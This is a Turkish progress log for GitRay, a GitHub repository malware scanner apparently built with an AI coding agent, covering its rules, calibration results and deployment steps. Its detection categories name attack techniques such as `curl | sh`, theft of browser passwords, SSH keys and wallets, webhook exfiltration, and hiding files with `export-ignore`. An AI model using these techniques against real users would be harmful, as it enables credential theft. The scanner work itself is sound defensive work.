# GitRay ilerleme günlüğü

Son güncelleme: **9 Ekim 2026**. Kurallar ve mimari için `CLAUDE.md`, ne yapıldığı ve ne kaldığı için bu dosya. Bu dosya kullanıcının kendi takip dosyasıdır; sitede gösterilmez (8. oturumda `/progress` sayfası kaldırıldı). Not: GitHub reposu public olduğu için dosya GitHub'da görünür.

## Şu anki durum

**Çalışan bir MVP var.** Bir GitHub reposunun adresi yazılıyor, site repoyu klonlamadan ve hiçbir kodu çalıştırmadan tarıyor, 0–100 arası bir risk puanı ve dört karardan birini (Temiz, Şüpheli, Tehlikeli, Eksik) veriyor. Her bulgu dosya, satır, ilgili kod parçası ve "neden tehlikeli" açıklamasıyla gösteriliyor. Taramalar veritabanına kaydediliyor: Temiz çıkanlar **Safe Zone**, Tehlikeli çıkanlar **Scammer** sayfasında listeleniyor.

| Parça | Durum |
| --- | --- |
| Tarama motoru (TypeScript, bellekte ve limitli) | Hazır |
| 34 kural, 9 kategori | Hazır |
| ZIP içeriğini tarama, `export-ignore` ile saklanan dosyaları yakalama | Hazır (5. oturum) |
| Web sitesi: arama, sonuç, Safe Zone, Scammer, kurallar, ilerleme | Hazır |
| JSON API: `GET /api/scan?repo=owner/name` | Hazır |
| CLI: `npm run scan -- owner/repo` | Hazır |
| Safe Zone ve Scammer sayfaları, kalıcı depolama (Neon Postgres) | Kod hazır; veritabanını kullanıcı Vercel'den bağlayacak |
| Zararlı bağımlılık kontrolü (OSV) | Hazır (6. oturum); rapordaki satır 7. oturumda her duruma görünür yapıldı, canlıda doğrulanmalı |
| Yanlış alarm kalibrasyonu | 1. tur yapıldı (7. oturum): 38 popüler temiz repodan 28'i Temiz (önce 15); 8. oturumdaki test dosyası kararından sonra Tehlikeli 3 |
| Testler | 22 dosya, 749 test |
| Vercel'e deploy | Kod `main`'de; token ve veritabanını kullanıcı ekleyecek (adımlar aşağıda) |
| VirusTotal API | Yok (API anahtarı gerekiyor, kullanıcıya sorulacak) |

## Yayına alma rehberi (kullanıcı için, adım adım)

**Adım 1: Yeni kodu `main` dalına al.** Yapıldı (3. oturum): değişiklikler PR ile `main`'e birleştirildi. Vercel `main`'i yayınlar; import ekranı bundan önce "Other" framework gösteriyorduysa sebebi `main`'deki eski Python koduydu.

**Adım 2: GitHub token oluştur** (saatte 60 yerine 5.000 GitHub isteği; yaklaşık 1.000 yeni tarama).
1. https://github.com/settings/personal-access-tokens/new adresini aç (yol: profil fotoğrafı → Settings → en altta Developer settings → Personal access tokens → Fine-grained tokens → Generate new token).
2. Token name: `gitray-vercel`. Expiration: en uzun seçenek (süre dolunca yenisini oluşturup Vercel'de değiştirmek gerekir).
3. Resource owner: kendi hesabın. Repository access: **Public repositories**.
4. Permissions kısmına dokunma (hiçbir izin gerekmez).
5. "Generate token" → `github_pat_...` ile başlayan değeri kopyala. Yalnızca bir kez gösterilir. Kimseyle paylaşma, koda ya da sohbete yapıştırma.

**Adım 3: Vercel projesini kur.**
1. vercel.com → "Add New… → Project" → `Dorukkino/GitRay` → Import.
2. "Configure Project" ekranında: Framework Preset **Next.js**, Root Directory `./`, Build ve Output ayarlarına dokunma.
3. "Environment Variables" bölümünü aç: Key `GITHUB_TOKEN`, Value kopyaladığın token → Add.
4. "Deploy". Proje zaten oluşturulduysa: Project → Settings → Environment Variables'tan ekle, sonra Deployments → son deploy → "⋯" → Redeploy (ortam değişkenleri yalnızca yeni deploy'da etkili olur).

**Adım 4: Veritabanını bağla** (Safe Zone ve Scammer listeleri için).
1. Vercel'de projeyi aç → **Storage** sekmesi → "Create Database" → **Neon** (Serverless Postgres) → Continue.
2. Plan: **Free**. Bölge: Vercel fonksiyonlarının varsayılan bölgesine yakın olan **Washington, D.C. (US East)**. Bir isim ver → Create.
3. "Connect Project" ekranında `gitray` projesini seç, tüm ortamları (Production, Preview, Development) işaretle → Connect. `DATABASE_URL` otomatik eklenir.
4. Deployments → Redeploy. Tablo ilk taramada kendiliğinden oluşur; ayrıca bir şey yapmaya gerek yok.

**Adım 5: Dene.** Siteyi aç, birkaç repo tara (örn. `octocat/Hello-World`, `pallets/flask`). Temiz çıkanlar en geç 1 dakika içinde Safe Zone'da görünür.

## Yol haritası

- [x] **Aşama 0: Sıfırdan başlangıç.** Eski Python kodu silindi, Next.js + TypeScript iskeleti kuruldu.
- [x] **Aşama 1: MVP.** Motor, 27 kural, web arayüzü, API, CLI, demo rapor, testler, `CLAUDE.md` ve `PROGRESS.md`.
- [x] **Aşama 1.5: Safe Zone ve Scammer.** Taramaların Postgres'e kaydedilmesi, iki liste sayfası, veritabanından önbellek, "Scan again now".
- [ ] **Aşama 2: Yayına alma.** Dalın `main`'e birleştirilmesi, Vercel'e deploy, `GITHUB_TOKEN`, Neon veritabanı (yapıldı), gerçek repolarda deneme ve kalibrasyon (1. tur 7. oturumda yapıldı; test dosyası ve repo itibarı kararı bekleniyor).
- [ ] **Aşama 3: Daha derin analiz.** Bağımlılıklar için OSV (yapıldı, 6. oturum), release digest'leri için VirusTotal API (kotaya dikkat), commit geçmişi sinyalleri (repo'dan eski commit tarihleri), typosquatting (popüler paket adlarına benzeyen bağımlılıklar), `setup.py` için `ast` tabanlı veri akışı analizinin geri getirilmesi.
- [ ] **Aşama 4: Paylaşım ve kötüye kullanıma karşı koruma.** Listelerde sayfalama ve arama, tarama geçmişi (aynı reponun eski sonuçları), veritabanında kalıcı hız sınırı, Cloudflare Turnstile.
- [ ] **Aşama 5: Vitrin.** README'ye ekran görüntüleri ve mimari diyagram, "nasıl çalışır" ve "sınırlamalar" sayfaları, Open Graph görselleri.
- [ ] **Aşama 6 (opsiyonel):** Tarayıcı eklentisi (GitHub sayfasında rozet), GitHub Action, Gradle/Podfile/Makefile kuralları, LLM ile bulgu özeti.

## Oturum günlüğü

### 9 Ekim 2026: Sıfırdan yeniden başlangıç ve MVP

**İstek:** Kullanıcı, MVP görmeden kod yazdırdığını, mevcut kodu incelememi ve gerekirse silip sıfırdan başlamamı istedi. Hedef: scanrepo.dev / VirusTotal benzeri, GitHub repolarındaki zararlı yazılımları bulan bir site; neyin taranacağına ben karar vereceğim; her şey bir `CLAUDE.md` / `PROGRESS.md` dosyasına kaydedilecek; sonuç localhost'ta ve Vercel'de görülebilecek.

**Eski kodun değerlendirmesi** (commit `a59f432`, branch `main`):
- Python 3.13 + uv, yalnızca CLI. Yaklaşık 4.700 satır, 10 kural, iyi testler.
- Güçlü yanları: güvenlik kuralları (kod çalıştırmama, bellekte limitli tar okuma, gzip bombası koruması, defang), açıklanabilir bulgular, fixture tabanlı kural testleri.
- Sorunlar: web arayüzü hiç yoktu; mimari VPS + PostgreSQL + worker üzerine kuruluydu (Vercel'e uymuyor); kodun yaklaşık üçte biri (`pyflow.py`, 1.372 satır) yalnızca `setup.py` dosyalarının veri akışı analizine harcanmıştı. MVP'den önce tek bir kurala çok derin yatırım yapılmıştı.
- Karar: Silip TypeScript ile yeniden yazmak. Fikirler ve dersler taşındı, kod taşınmadı. Eski kod git geçmişinde duruyor (`git show a59f432:src/gitray/engine/pyflow.py`).

**Mimari kararlar** (gerekçeleriyle):
- **Next.js 16 + TypeScript, tek uygulama.** Vercel'e sıfır ayarla deploy olur; arayüz, API ve motor aynı dilde; ücretsiz.
- **Sunucusuz çalışmaya uygun motor.** Veritabanı ve kuyruk yok: bir tarama tek bir API isteği içinde 2–20 saniyede biter. Süre bütçesi (45 sn) aşılırsa sonuç hata değil "Eksik" olur.
- **Kendi tar ayrıştırıcımız.** Limitleri tam kontrol edebilmek için (yaklaşık 150 satır). gzip'i Node'un `zlib`'i açar ama her bayt bizim sayacımızdan geçer.
- **Kalıcılık yok (şimdilik).** Önbellek her sunucu örneğinin belleğinde (10 dk) ve Vercel CDN'de (`s-maxage=600`). Kalıcı depolama dış servis gerektirdiği için kullanıcıya sorulacak.
- **Arayüz İngilizce,** belgeler Türkçe.

**Neyin taranacağı** (benim kararım, gerekçe: son yıllardaki GitHub tabanlı saldırı kampanyaları):
1. *Otomatik çalışan dosyalar*: kurban kodu okumadan çalışan her şey. npm `postinstall`, `setup.py`, VS Code `folderOpen` görevleri (sahte iş görüşmesi projeleri), Visual Studio build olayları (güvenlik araştırmacılarını hedef alan kampanya), Rust `build.rs`.
2. *Zararlı kod kalıpları*: çözüp çalıştırma, `curl | sh`, bilgi hırsızlarının hedeflediği dosyalar (tarayıcı şifreleri, çerezler, SSH anahtarları, kripto cüzdanları), Discord webhook / Telegram bot ile veri kaçırma, Windows'un kendi araçlarıyla indirme, gizlenme ve kalıcılık.
3. *Gizleme*: yüksek entropili veri, Trojan Source, satırın sağına yüzlerce boşlukla itilmiş kod (sahte GitHub projelerinde yaygın), görünmez Unicode ile saklanmış payload.
4. *README sosyal mühendisliği*: sahte "free tool / cheat / crack" repoları kodda değil README'de saldırır: dosya paylaşım sitesine link, arşiv şifresi, "antivirüsü kapat".
5. *İkili dosyalar*: commit edilmiş exe/ELF/Mach-O, `.lnk` kısayollar, şifreli arşivler. Yalnızca başlık baytlarına bakılır.
6. *Repo sinyalleri*: yeni hesap, yeni repo (zayıf, tek başına karar değiştirmez).

**Yapılanlar:**
- Motor: `src/engine/` (types, limits, errors, target, text, github, archive, rules, scoring, scanner, report).
- 27 kural ve 141 zararsız fixture dosyası (her kural için pozitif ve negatif).
- Web: ana sayfa, `/scan/[owner]/[repo]` (yükleme animasyonu, hata ekranı, rapor), `/demo` (sahte repo, build sırasında gerçek motorla taranır), `/rules` (motordan üretilir), `/progress` (bu dosya), `GET /api/scan`.
- Rapor ekranı: puan halkası, karar rozeti, repo bilgileri, puan dağılımı, kategori/önem filtreli bulgular, GitHub'daki satıra link, release dosyaları ve VirusTotal linki, ham JSON indirme.
- Güvenlik başlıkları (`X-Frame-Options`, `nosniff` vb.), IP başına hız sınırı, eş zamanlı tarama sınırı.
- Testler: tar okuyucu (symlink, gzip bombası, bozuk arşiv, uzun yollar, UTF-16), GitHub istemcisi (yönlendirmeler, token sızmaması, hata kodları), tarayıcı (limitler, Eksik kararı), rapor güvenliği, API servisi, CLI, mimari ve güvenlik değişmezleri.

**Doğrulama:**
- `npm run lint`, `npm run typecheck`, `npm test` (477 test) ve `npm run build` temiz.
- Production sunucusu yerelde çalıştırıldı; Playwright ile ana sayfa, demo, gerçek tarama, kurallar ve ilerleme sayfalarının ekran görüntüleri alındı. Tarayıcı konsolunda hata yok, mobilde (390 px) yatay taşma yok.
- Gerçek tarama: `Dorukkino/GitRay` reposunun `main` dalı (eski Python kodu) 2,2 saniyede tarandı: 152 dosya, karar Tehlikeli (100). Bu beklenen bir sonuç: eski kodun test fixture'ları bilerek zararlı kalıplar içeriyor (aşağıdaki kalibrasyon notuna bakın).
- Bu bulut ortamındaki proxy yalnızca bu repoya izin verdiği için başka repolarla gerçek tarama denenemedi.

**Bu oturumda yaşanan ve düzeltilen hata:** `CLAUDE.md` yazılırken örnek olarak yazılan bir `\u` kaçış dizisi, araç çağrısının JSON katmanında gerçek bir görünmez karaktere (U+2028) dönüştü. Fark edilip düzeltildi; `tests/security.test.ts` artık `CLAUDE.md`, `PROGRESS.md` ve `README.md`'yi de denetliyor.

### 9 Ekim 2026 (2. oturum): Safe Zone, Scammer ve veritabanı

**İstek:** Kullanıcı Vercel'de import'a bastı; token'ın ne olduğunu ve nereden alınacağını, Vercel'in istediği ayarları sordu. İki yeni sayfa istedi: **Safe Zone** (son taranan ve güvenilir repolar) ve **Scammer** (zararlı dosya bulunan repolar); bunun için sonuçların kaydedilmesi gerekiyor. Saatte 12 taramanın az olduğunu söyledi.

**Kararlar:**
- Veritabanı: **Neon Postgres, ücretsiz plan.** Vercel'in Storage sekmesinden iki tıkla eklenir, `DATABASE_URL`'i kendisi ayarlar, sunucusuz ortama uygun HTTP sürücüsü var. Eski planda da PostgreSQL seçilmişti.
- Her reponun yalnızca son taraması saklanır; yeniden tarama kaydın üzerine yazar. Böylece düzeltilen bir repo Scammer'dan çıkar.
- Safe Zone = son taraması **Temiz** olanlar; Scammer = son taraması **Tehlikeli** (≥70) olanlar. Şüpheli ve Eksik hiçbir listeye girmez: yanlış alarm riski yüksek, herkese açık bir listede birini haksız yere "scammer" göstermemek için.
- Scammer sayfasında sonucun otomatik olduğu, güvenlik araçlarının da listeye girebileceği açıkça yazıyor ve yanlış alarm bildirme linki var.
- 12 tarama sınırı yalnızca tokensız durum içindi. Tokenla saatte yaklaşık 1.000 yeni tarama yapılabilir. Son 1 saatte taranmış bir repo veritabanından gelir ve GitHub kotası harcamaz. "Scan again now" düğmesi (`fresh=1`) beklemeden yeniden tarar.

**Yapılanlar:**
- `src/lib/db.ts`, `src/lib/scan-store.ts` (Postgres deposu + veritabanı yokken boş depo), `src/lib/lists.ts`.
- `scan-service`: veritabanından önbellek (1 saat), taramadan sonra kayıt; veritabanı hatası taramayı bozmaz.
- `/safe-zone` ve `/scammer` sayfaları (önce 30, 3. oturumda 60 saniyede bir yenilenir), menü linkleri, tarama sayfasında "Scanned … ago · Scan again now" çubuğu.
- Testler: depo testleri PGlite ile gerçek Postgres üzerinde, servis testleri (önbellek, `fresh`, veritabanı hatası), liste bileşeni (HTML kaçışı) testleri. Toplam 494 test.
- `.env.example`'a `DATABASE_URL` eklendi; yayına alma rehberi yazıldı.

**Doğrulama:** Lint, tip kontrolü, 494 test ve production build temiz. Yerelde veritabanı olmadan iki sayfa "database not connected" mesajı gösteriyor, tarama ve yeniden tarama çalışıyor, konsolda hata yok. Neon'a gerçek bağlantı bu ortamda denenemedi (hesap yok); aynı SQL PGlite üzerinde test edildi.

### 9 Ekim 2026 (3. oturum): Demo kaldırıldı, kod incelemesi, merge

**İstek:** PR ve merge işlerini Claude üstlensin; veritabanı ve sistem baştan sona kontrol edilsin; demo rapor siteden kaldırılsın. Kullanıcı kendi projelerini tarayıp çıktılar üzerine konuşacak. Tasarım (koyu tema yerine yeni görünüm) en son ele alınacak.

**Yapılanlar:**
- `/demo` sayfası, `src/lib/demo.ts` ve testi silindi; menüdeki, ana sayfadaki ve boş Scammer listesindeki linkler kaldırıldı.
- Bağımsız bir kod incelemesi (ayrı bir ajan) veritabanı, API ve önbellek kodunu taradı. Doğrulanan hatalar düzeltildi:
  1. **"Scan again now" sonrası eski sonuç görünüyordu.** CDN önbelleği kapatıldı (`no-store`), bellek önbelleği 10 dk'dan 60 sn'ye indi ve veritabanındaki ömrü (1 saat) asla aşmıyor.
  2. **Emoji ortadan kesilince kayıt veritabanına yazılamıyordu.** 300 karakterden uzun açıklamada kesim noktasına emoji denk gelirse Postgres JSON'u reddediyordu ve repo listelere hiç girmiyordu. `truncate` artık vekil çiftleri bölmüyor, `sanitize`/`snippet` en sonda `toWellFormed()` çağırıyor.
  3. **Veritabanı şifresi loglara düşebilirdi.** Neon sürücüsü hatalı bir bağlantı dizesini mesaja olduğu gibi koyuyor; yeni `src/lib/log.ts` bağlantı dizelerini ve tokenları gizliyor.
  4. **Eski bir tarama yenisinin üzerine yazabiliyordu.** Upsert artık yalnızca daha yeni taramayla güncelliyor.
- Riskler için alınan önlemler:
  - Tablo oluşturma yarışı hata sayılmıyor.
  - Neon sorgularına 5 sn zaman aşımı eklendi; 45 sn'lik süre bütçesi artık GitHub metadata isteklerini de kapsıyor.
  - Süre yüzünden yarım kalan taramalar saklanmıyor.
  - Veritabanı sorguları için ayrı hız sınırı var; IPv6 adresleri /64 olarak gruplanıyor; sınır listesi dolunca herkesin sayacı sıfırlanmıyor.
  - "Scan again now" son 1 dakikadaki sonucu döndürüyor; "busy" yanıtı kota harcamıyor.
  - Tablo en fazla 5.000 satır tutuyor.
  - Liste sayfaları 60 sn'de bir yenileniyor; Neon'un ücretsiz planında veritabanı ziyaret yokken uyuyabiliyor.
  - Geçersiz ya da süresi dolmuş `GITHUB_TOKEN` için açık bir hata mesajı var.
  - `engines.node` `22.x` olarak sabitlendi.
- Yeni testler: emoji kesme, eski taramanın üzerine yazmama, satır temizleme, tablo yarışı, log gizleme, token hatası, süre bütçesi, hız sınırları, IPv6 gruplama. Toplam 504 test.
- `claude/sleepy-cray-iz5dsv` dalı PR ile `main`'e birleştirildi.

### 9 Ekim 2026 (4. oturum): Gerçek repolarla ilk kalibrasyon

**İstek:** Kullanıcı token'ı bağladı ve kendi üç reposunu hem GitRay'de hem scanrepo.dev'de taradı. Sonuçlar birbirini tutmadı; hangisinin doğru olduğu soruldu.

| Repo | scanrepo.dev | GitRay (önce) | GitRay (düzeltmeden sonra) | Gerçek durum |
| --- | --- | --- | --- | --- |
| PocketWallet (Expo / React Native bütçe uygulaması) | 70 | 0 | 0 | Temiz |
| KinoCoach (Next.js + Supabase koçluk uygulaması) | 36 | 0 | 0 | Zararlı kod yok |
| theme-store (Zen tarayıcısı için mod/tema mağazası) | 0 | 35 | 0 | Temiz |

**İnceleme** (repolar klonlandı, hiçbir kod çalıştırılmadı):
- PocketWallet: scanrepo.dev'in "Code Execution" altında işaretlediği üç dosya (`MarketAdviceCard.tsx`, `useBudget.ts`, `currency.ts`) satır satır okundu. Biri arayüz bileşeni, biri kullanıcının kendi Supabase tablolarına yazan hook, biri frankfurter.app'ten döviz kuru çeken yardımcı. Gizli karakter, kod çözme, dinamik çalıştırma ya da veri sızdırma yok. scanrepo.dev'in neden işaretlediği görülemiyor; "wallet" kelimesi, ağ isteği ve yerel depolama birlikteliği bir hırsız (stealer) sezgiselini tetiklemiş olabilir (tahmin, doğrulanamadı). Sonuç: scanrepo.dev'in 70'i yanlış alarm.
- KinoCoach: Kurulumda otomatik çalışan bir şey yok (`build` sadece `sharp` ile favicon üretiyor), dinamik kod çalıştırma yok, servis anahtarları ortam değişkeninden okunuyor. Zararlı kod bulunmadı.
- theme-store: GitRay'in 35 puanı üç yanlış alarmdan geliyordu. Hepsi düzeltildi:
  1. **Motor hatası:** 120–375 KB'lık tek satırlık gömülü resimler (`data:image/png;base64,...`) 10.000 karakterlik pencerelere bölündüğünde yalnızca ilk pencere `data:` önekini içeriyordu, geri kalanı "rastgele veri" sayılıyordu. Maskeleme artık pencerelemeden önce tüm dosyada yapılıyor.
  2. GitHub'ın özel resim linklerindeki `?jwt=...` imzası rastgele veri sayılıyordu. Linklerin içi artık entropi kontrolüne girmiyor.
  3. ZIP içindeki düz `.js` dosyaları "çalıştırılabilir" sayılıyordu (mod arşivleri `.uc.js` dolu). `.js` listeden çıkarıldı; `.jse`, `.wsf`, `.vbs` gibi Windows Script Host biçimleri kaldı.
  4. Ayrıca `data:image/svg+xml;utf8;base64,...` biçimi (değersiz parametre) tanınmıyordu, düzeltildi.
- theme-store'daki 64 `mod.zip` ayrıca açılıp (çalıştırılmadan) tarandı: zararlı kalıp yok. Çıkanlar mod README'lerindeki kendi GitHub linkleri, `"prepare": "husky"` ve gömülü ikonlardı.

**Öğrenilenler ve fikirler:**
- GitRay ZIP arşivlerinin içini okumuyor, yalnızca dosya adlarına bakıyor. Bellekte ve limitli ZIP okuma eklenmeli (zararlı yazılım sık sık ZIP içinde gelir).
- **Olası kaçış yolu:** GitHub'ın tarball'ı `.gitattributes` içindeki `export-ignore` kurallarına uyar. Saldırgan bir dosyayı `export-ignore` ile işaretlerse dosya `git clone` ile gelir ama GitRay'in indirdiği arşivde olmaz. Çözüm önerisi: Git Trees API (`/git/trees/<sha>?recursive=1`) ile dosya listesini alıp arşivdekiyle karşılaştırmak, eksik dosyaları işaretlemek.
- Yeni otomatik çalışma vektörleri: Claude Code (`.claude/settings.json` içindeki `hooks`), Cursor ve benzeri yapay zekâ araçlarının proje ayarları komut çalıştırabiliyor. VS Code `folderOpen` kuralına benzer bir kural eklenebilir.
- Sızdırılmış gizli bilgiler (test dosyalarında şifre, API anahtarı) repoyu klonlayanı değil repo sahibini tehdit eder. Ayrı, puana katılmayan bir "bilgi" kategorisi olarak düşünülebilir.

### 9 Ekim 2026 (5. oturum): ZIP içeriği ve `export-ignore` kaçışı

**İstek:** 4. oturumda bulunan iki boşluğun kapatılması: (1) ZIP'lerin içinin taranmaması, (2) `export-ignore` ile dosya saklama.

**1. ZIP içeriği** (`src/engine/zip.ts`):
- Repodaki `.zip` dosyaları 20 MB'a kadar bütün olarak okunur, merkezi dizinden üyeler listelenir ve bellekte açılır (stored ve deflate). Hiçbir şey diske yazılmaz, çalıştırılmaz.
- Zip bombasına karşı üye başına 1 MB okunur, tarama başına toplam 50 MB açılmış veri sınırı var; açma işlemi akış halinde ve okundukça yapılır. Şifreli üyeler, symlink'ler, bilinmeyen sıkıştırma ve ZIP64 atlanıp sayılır. ZIP içinde ZIP iki seviyeye kadar açılır.
- Üyeler `arşiv.zip!/iç/yol` adıyla taranır; raporda "inside a ZIP file" etiketi var, "GitHub'da gör" linki ZIP dosyasına gider.
- ZIP üyelerinde yalnızca içerik kuralları çalışır (zararlı kod, gizleme, ikili dosya). Link, sosyal mühendislik ve kurulum betiği kuralları çalışmaz: arşivin içindeki README kimseye gösterilmez, `package.json` klonlayınca çalışmaz. Bu karar theme-store kalibrasyonundan geldi (mod arşivlerindeki README linkleri ve `husky` yanlış alarm veriyordu).
- `GR-BIN-001`'in "ZIP'in içinde şu var" isim kontrolü artık yalnızca Windows programları, başlatıcılar, şifrelenmiş betikler ve disk imajları için (ZIP açılamazsa işe yarar). Düz betiklerin (`.bat`, `.ps1`) içeriği zaten taranıyor.

**2. `export-ignore` kaçışı** (`scanner.ts`, `github.ts`, `GR-REPO-003`):
- Tarama tam bittiyse commit'in dosya listesi Git Trees API'den alınır ve arşivdeki yollarla karşılaştırılır. Eksik dosyalar `raw.githubusercontent.com`'dan ayrıca indirilip taranır (en fazla 300 dosya / 20 MB, önce kod ve çalıştırılabilir dosyalar; API kotası harcanmaz, token gönderilmez).
- Saklı dosya varsa `GR-REPO-003` (+5) eklenir. İndirilemeyen saklı dosya kalırsa tarama Eksik sayılır, çünkü saldırganın saklamak istediği tam olarak bu dosyalardır.
- Liste alınamazsa ya da GitHub listeyi kısaltırsa kontrol "unavailable" olur, tarama bozulmaz. Raporda ve arayüzde sonuç gösteriliyor.

**Doğrulama:**
- 540 test geçiyor. Yeni testler zip bombası, iç içe ZIP, şifreli/symlink üyeler, kısmen okunmuş ZIP, saklı dosyanın indirilip taranması, indirilemeyen saklı dosya, symlink'in "eksik" sayılmaması ve kısaltılmış listeyi kapsıyor.
- Gerçek tarama: `Dorukkino/GitRay`, 315 dosyalık liste arşivle karşılaştırıldı, eksik yok, 2,4 sn.
- Kullanıcının repoları yeni motorla yeniden tarandı: theme-store 64 ZIP'i açılarak (yaklaşık 2.000 dosya, 45 MB) 15 puanla Temiz. Puanın tamamı, bir mod'un içinde font diye kaydedilmiş base64 HTML dosyalarından geliyor. PocketWallet ve KinoCoach 0.

### 9 Ekim 2026 (6. oturum): Otomatik çalışma yolları ve zararlı bağımlılıklar

**İstek:** "Ne eksik?" sorusuna verilen öneri listesinden 2 (eksik otomatik çalışma yolları) ve 1 (zararlı bağımlılıklar, OSV) yapıldı. Kullanıcı OSV'yi onayladı.

**Otomatik çalışma yolları** (`src/engine/rules/devtools.ts`, 5 yeni kural):
- `GR-AUTO-006` dev container `initializeCommand` (konteynerde değil senin bilgisayarında çalışır): +15, indirme ya da çözme varsa +40.
- `GR-AUTO-007` repodaki bir programı gösteren VS Code ayarları (`git.path`, `*.executablePath`, terminal profilleri, `go.alternateTools`): +30. `.venv`, `venv`, `node_modules` ve yalnızca komut adı (`git`) yok sayılır.
- `GR-AUTO-008` Claude Code hook'ları (statusLine ve yardımcı komutlar dahil), Cursor hook'ları, Gemini CLI; +25, riskliyse +40. Proje MCP sunucuları +10, riskliyse +35 (genelde kullanıcı onayı istenir).
- `GR-AUTO-009` `.npmrc`: kod yükleyen `node-options` (`--require`, `--import`, `--loader`) ya da standart olmayan `script-shell`: +35.
- `GR-AUTO-010` uzaktan kod çeken `.envrc` (direnv): +20.
- Bu ayar dosyaları yorum ve sondaki virgül içerebildiği için küçük bir JSONC ayrıştırıcı eklendi (`text.parseJsonc`).

**Zararlı bağımlılıklar** (`deps.ts`, `osv.ts`, `GR-DEP-001` +70):
- 9 bağımlılık dosyası biçimi okunuyor; kilit dosyalarındaki geçişli (transitive) bağımlılıklar da dahil.
- OSV'den yalnızca zararlı paket kayıtları (`MAL-`) kullanılıyor. Kilit dosyasında tam sürüm varsa doğrudan eşleşme aranıyor. Yalnızca aralık varsa paket ancak **her sürümü** zararlıysa (typosquat) işaretleniyor. Bazı sürümleri ele geçirilmiş popüler paketler (2025'teki chalk/debug saldırısı gibi) işaretlenmiyor; yoksa bu paketleri kullanan her repo yanlış alarm verirdi.
- OSV'ye ulaşılamazsa tarama bozulmuyor, raporda "OSV could not be reached" yazıyor.

**Doğrulama:**
- 620 test geçiyor. Kapsananlar:
  - 9 dosya biçiminin ayrıştırılması (kesilmiş kilit dosyası, yerel/git kaynakları, takma adlar dahil)
  - sahte bir OSV sunucusuyla uçtan uca senaryolar: kilit dosyasındaki zararlı sürüm, yalnızca her sürümü zararlıysa işaretleme, CVE'lerin yok sayılması, OSV'nin kapalı olması, `node_modules` ve ZIP içinin okunmaması
  - beş yeni kuralın pozitif ve negatif örnekleri
- Gerçek tarama (`Dorukkino/GitRay`): 586 paket okundu, arşiv kontrolü tam, 2,7 sn.
- **Doğrulanmadı:** `api.osv.dev` bu çalışma ortamının ağ politikasında kapalı, OSV burada "unavailable" döndü. Gerçek OSV yanıtıyla doğrulama canlı sitede yapılacak.
- Kullanıcının üç reposu yeni kurallarla yanlış alarm vermedi (PocketWallet'taki `.claude/settings.json` yalnızca plugin ayarı içeriyor).

### 9 Ekim 2026 (7. oturum): OSV satırı ve 38 repoyla yanlış alarm kalibrasyonu

#### OSV satırı canlıda görünmüyordu (PR #6)

**Sorun:** Kullanıcı canlı sitede OSV ile ilgili hiçbir şey görmedi. İki sebep vardı:
- Site, son 1 saat içinde taranmış bir repo için veritabanındaki raporu veriyor. Kullanıcının repoları OSV kontrolü yayına girmeden önce taranmıştı; bu eski raporlarda `dependencyCheck` alanı yok, arayüz de bu durumda hiçbir şey göstermiyordu.
- Bağımlılık dosyası olmayan repolarda (theme-store gibi) ve kısmi taramalarda da satır gizleniyordu.

**Düzeltme:**
- `ENGINE_VERSION` 0.2.0 oldu. Başka bir motor sürümüyle yapılmış kayıtlı rapor artık önbellekten verilmiyor, repo yeniden taranıyor. Kural her değiştiğinde bu sürüm artırılacak (CLAUDE.md'ye yazıldı).
- Rapor özetinde artık her zaman bir "Malicious dependencies (OSV)" satırı var. Kaç paket kontrol edildi, bağımlılık dosyası yok mu, OSV'ye ulaşılamadı mı ya da rapor bu kontrolden eski mi, satırda yazıyor. Arşiv kontrolü de aynı listede gösteriliyor.
- Testler: eski motor sürümüyle kaydedilmiş raporun yeniden taranması, arayüzde üç durumun (paket sayısı, dosya yok, eski rapor) yazılması.

#### Yanlış alarm kalibrasyonu (1. tur)

**İstek:** Önceki önerinin 3. maddesi: popüler ve temiz repoları toplu tarayıp hangi kuralın yanlış alarm verdiğini ölçmek ve kuralları düzeltmek.

**Yöntem:**
- 38 popüler repo seçildi: JavaScript (react, vue, express, vite...), Python (django, flask, pip, poetry...), Rust (uv, rustup, ripgrep), Windows (terminal, PowerShell, notepad++), kurulum araçları (nvm, ohmyzsh, Homebrew), dev ortamı repoları (devcontainers, vscode-extension-samples, claude-code) ve link listeleri (awesome, public-apis, free-programming-books).
- Bu ortamdaki proxy, başka repoların GitHub API'sine izin vermiyor. Bu yüzden repolar `git clone --depth 1` ile indirildi ve aynı motorla yerelde tarandı. Kod çalıştırılmadı, dosyalar yalnızca okundu.
- Bu yerel taramada limit uygulanmadı, bütün dosyalara bakıldı. Repo yaşı ve hesap sinyalleri de yok; tüm repolar eski ve köklü sayıldı.
- Tekrar üretmek için: `npm run calibrate -- <klon-klasörü>` (`scripts/calibrate.ts`, liste `scripts/calibration-repos.txt`).

**Sonuç:**

| | Önce | Sonra |
| --- | --- | --- |
| Temiz | 15 | 28 |
| Şüpheli | 12 | 5 |
| Tehlikeli | 11 | 5 |

| Repo | Önce | Sonra | Kalan kurallar |
| --- | --- | --- | --- |
| `expressjs/express` | Temiz 20 | Temiz 0 | - |
| `axios/axios` | Şüpheli 58 | Temiz 13 | GR-AUTO-001 +10, GR-CODE-004 +3 |
| `lodash/lodash` | Şüpheli 65 | Temiz 10 | GR-CODE-001 +10 |
| `facebook/react` | Şüpheli 55 | Temiz 25 | GR-AUTO-008 +15, GR-AUTO-001 +10 |
| `vuejs/core` | Temiz 15 | Temiz 0 | - |
| `sveltejs/svelte` | Şüpheli 60 | Temiz 25 | GR-OBF-002 +15, GR-AUTO-001 +10 |
| `prettier/prettier` | Temiz 20 | Temiz 20 | GR-OBF-001 +15, GR-CI-001 +5 |
| `eslint/eslint` | Temiz 15 | Temiz 10 | GR-AUTO-001 +10 |
| `vitejs/vite` | Şüpheli 30 | Temiz 0 | - |
| `nvm-sh/nvm` | Temiz 20 | Temiz 5 | GR-CI-001 +5 |
| `ohmyzsh/ohmyzsh` | Şüpheli 58 | Temiz 3 | GR-CODE-004 +3 |
| `Homebrew/install` | Temiz 0 | Temiz 0 | - |
| `mozilla/pdf.js` | Temiz 25 | Temiz 25 | GR-OBF-001 +15, GR-AUTO-008 +10 |
| `gorhill/uBlock` | Temiz 25 | Temiz 25 | GR-LINK-001 +20, GR-CODE-003 +5 |
| `electron/electron` | Tehlikeli 100 | Tehlikeli 100 | GR-CODE-007 +35, GR-BIN-001 +30, GR-LINK-001 +20, GR-CODE-004 +15, GR-OBF-001 +15, GR-AUTO-001 +10, GR-CODE-003 +5 |
| `microsoft/vscode-extension-samples` | Temiz 15 | Temiz 10 | GR-AUTO-001 +10 |
| `devcontainers/templates` | Temiz 15 | Temiz 10 | GR-AUTO-006 +10 |
